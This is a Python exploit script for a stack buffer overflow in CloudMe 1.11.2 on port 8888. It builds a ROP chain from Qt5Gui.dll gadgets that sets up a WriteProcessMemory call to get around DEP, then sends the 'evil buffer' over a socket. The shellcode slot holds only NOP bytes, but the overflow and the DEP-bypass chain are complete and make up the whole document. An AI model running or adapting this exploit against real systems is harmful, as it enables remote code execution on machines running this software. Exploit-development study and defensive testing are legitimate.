#!/usr/bin/python
# Exploit Author: Xavier Lim (TrickDKing)
# Vendor Homepage:https://www.cloudme.com/en
# Software: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Category: Local
# Tested on: Windows 10 Pro x64

import socket, sys
from struct import pack

try:
    server = sys.argv[1]
    port = 8888
    size = 2000

    wpm  = pack("<L", (0x46464646))  # Dummy WriteProcessMemory Address (Address of IAT entry containing WPM)
    wpm += pack("<L", (0x61f8b140))  # Shellcode Return Address (Return address after executing WPM) 
    wpm += pack("<L", (0xFFFFFFFF))  # Pseudo Process handle (0xFFFFFFFF is set, it is -1 for the current process) Value of hProcess
    wpm += pack("<L", (0x61f8b140))  # Code cave address (Shellcode RET Address) (Value of lpBaseAddress)
    wpm += pack("<L", (0x49494949))  # Dummy lpBuffer (Stack address) 
    wpm += pack("<L", (0x50505050))  # Dummy nSize 
    wpm += pack("<L", (0x51515151))  # lpNumberOfBytesWritten 

    inputBuffer = b"\x90" * (1052 - len(wpm))
    # ROP gadgets are from Qt5Gui.dll
    # Command: rp-win-x86.exe -f Qt5Gui.dll -r 5 > rop.txt
    
    # Preserving the stack address
    eip = pack("<L", (0x61bd4a1e))   # push esp ; pop ebx ; pop esi ; ret ;
    rop = pack("<L", (0x90909090))   # Stack alignment for pop esi
    rop += pack("<L", (0x61b7eae4))  # mov eax, ebx ; pop ebx ; ret ;
    rop += pack("<L", (0x90909090))  # Stack alignment for pop ebx
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += pack("<L", (0xfffffbd8))  # -0n1056 to pop into ecx
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ; # ROP skeleton is is in EAX
    # End of preserving the stack address

    # Start of patching WriteProcessMemory address
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += pack("<L", (0x6210b05c))  # IAT address for KERNEL32!GetCurrentProcess
    rop += pack("<L", (0x61eeecfe))  # mov eax,  [ecx] ; ret ; # IAT of KERNEL32!GetCurrentProcess in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; #  Make a copy of the IAT in ECX
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffebb10))  # Negative of 0x000144f0 or 0n83184
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # Hex value 0x144f0 in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ; # IAT of KERNEL32!WriteProcessMemory in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Make a copy of the IAT to ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; ROP skeleton dummy WPM is overwritten
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching WriteProcessMemory address dummy value 0x46464646

    # Start of patching lpBuffer (Base pointer of the shellcode) Dummy value 0x49494949
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffffff0))  # Negative value of 0n16 or 0x10
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # 0n16 in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Make a copy of 0n16 in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # Copy of ROP skeleton to ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ;
    rop += pack("<L", (0xfffffaba))  # Negative value of 0n1350 or 0x546
    rop += pack("<L", (0x61eed92a))  # neg eax ; ret ; # 0n1350 in EAX
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # stack address in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; ROP skeleton dummy lpBuffer is overwritten
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching lpBuffer address dummy value 0x49494949

    # Start of patching nSize 0x50505050
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ba88f1))  # pop eax ; ret ; # Negative value of 0n528 or 0x210
    rop += pack("<L", (0xfffffdf0))  # neg eax ; ret ; # 0n528 in EAX
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ; # 0n528 in ECX
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in EAX
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; # ROP skeleton dummy nSize is overwritten
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    # End of patching nSize 0x50505050

    # Start of patching lpNumberOfBytesWritten dummy value 0x51515151
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61ecb2b5))  # inc eax ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61ec26c0))  # xor eax, eax ; ret ;
    rop += pack("<L", (0x61be5213))  # stc ; mov ecx, eax ; mov eax, ecx ; ret ;
    rop += pack("<L", (0x61dcd14b))  # xchg eax, esi ; ret ; # ROP skeleton is in ESI
    rop += pack("<L", (0x61d7c0ff))  # mov  [eax+0x08], ecx ; retn 0x0008 ; # ROP skeleton dummy lpNumberOfBytesWritten is overwritten
    # End of patching lpNumberOfBytesWritten dummy value 0x51515151

    # Realignment back to start of ROP skeleton
    rop += pack("<L", (0x61e2b62d))  # pop ecx ; ret ;
    rop += b"C" * 8                  # Stack alignment for retn 0x08
    rop += pack("<L", (0xfffffff0))  # 
    rop += pack("<L", (0x61b930c8))  # add eax, ecx ; ret ;

    # Redirect execution flow to WPM function
    rop += pack("<L", (0x61d81114))  # xchg eax, esp ; ret ; 

    padding = b"\x90" * 20
    
    # WPM is offset 000144f0 away from GetCurrentProcess
    
    shellcode = b""
    shellcode += b"\x90" * 500
    
    filler = b"\x90" * (size - len(wpm) - len(inputBuffer) - len(eip) - len(rop)- len(padding) - len(shellcode))
    print(len(rop))

    payload = wpm
    payload += inputBuffer
    payload += eip
    payload += rop
    payload += padding
    payload += shellcode
    payload += filler
    
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(payload)
    s.close()
  
    print("Done!")
  
except socket.error:
    print("Could not connect!")
